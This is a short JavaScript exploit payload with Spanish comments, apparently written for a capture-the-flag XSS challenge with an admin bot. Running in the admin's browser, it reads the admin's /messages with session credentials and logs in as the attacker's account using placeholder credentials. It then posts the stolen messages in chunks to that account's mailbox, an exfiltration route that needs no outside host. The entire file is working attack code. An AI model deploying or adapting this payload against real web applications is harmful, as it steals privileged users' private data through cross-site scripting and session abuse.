// navaja_dump.js — lee /messages como ADMIN y lo publica en tu buzón (same-origin)
(async () => {
  const sleep = (ms) => new Promise(r => setTimeout(r, ms));

  try {
    // 1) Leer mensajes del ADMIN (porque el bot está logueado como admin)
    const r = await fetch('/messages', { credentials: 'include' });
    const j = await r.json();                 // {messages:[{id,message},...]}
    const dump = JSON.stringify(j);           // volcamos todo

    // 2) Pivot: loguearse como TU usuario para publicar en TU buzón
    const YOUR_USER = 'insider1';   // <-- cámbialo a tu user
    const YOUR_PASS = 'insideer';     // <-- cámbialo a tu pass
    await fetch('/auth', {
      method: 'POST',
      headers: {'Content-Type':'application/x-www-form-urlencoded'},
      body: 'action=login&username=' + encodeURIComponent(YOUR_USER) +
            '&password=' + encodeURIComponent(YOUR_PASS)
    });
    await sleep(300);

    // 3) Publicar en trozos para no pasarnos de tamaño
    const CHUNK = 800;
    for (let i = 0, part = 0; i < dump.length; i += CHUNK, part++) {
      const slice = dump.slice(i, i + CHUNK);
      await fetch('/create_msg', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({ message: `ADM_DUMP_${part}: ${slice}` })
      });
      await sleep(60);
    }
  } catch (e) {
    try {
      await fetch('/create_msg', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({ message: `ADM_DUMP_ERR: ${e && e.message ? e.message : String(e)}` })
      });
    } catch (_) {}
  }
})();
